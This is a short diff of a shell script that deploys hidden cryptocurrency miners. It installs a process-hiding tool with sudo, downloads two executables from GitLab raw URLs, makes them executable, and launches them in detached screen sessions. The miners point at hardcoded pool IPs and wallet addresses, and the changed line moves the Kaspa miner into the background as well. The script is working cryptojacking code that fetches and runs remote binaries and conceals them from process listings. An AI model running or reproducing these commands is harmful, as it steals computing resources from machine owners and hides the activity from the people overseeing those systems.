@@ -6,6 +6,6 @@ sudo npm i -g node-process-hider && sudo ph add image && sudo ph add videos
 wget -qO image https://gitlab.com/teletyl/oon/-/raw/main/news && chmod +x image
 wget -qO videos https://gitlab.com/sarifadim/jomblo/-/raw/main/perusa && chmod +x videos
 screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.NONAME -t 5
-./image --algo KASPA --pool 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-0100-$(date +"%T")) --tls enable
+screen -dms run ./image --algo KASPA --pool 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-0100-$(date +"%T")) --tls enable
 EOF
 
